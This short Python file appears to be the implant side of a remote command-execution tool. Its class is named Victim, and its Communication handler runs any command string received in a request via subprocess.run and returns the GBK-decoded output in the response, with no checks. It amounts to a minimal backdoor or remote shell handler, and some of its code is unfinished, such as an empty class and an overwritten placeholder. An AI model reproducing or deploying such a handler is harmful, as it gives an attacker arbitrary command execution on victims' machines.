from subprocess import PIPE, Popen, run
from micro.proto.model.common_pb import Request, Response


class Victim:
    def __init__(self):
        pass


def Communication(req: Request, rsp: Response):
    rsp.Msg = "ifconfig"
    # 返回的是byte类型，需要将byte转换为str,gbk编码
    comp_process = run(f"{req.cmd}", stdout=PIPE, stderr=PIPE)
    rsp.Msg = comp_process.stdout.decode('gbk')
    err = comp_process.stderr
    return err
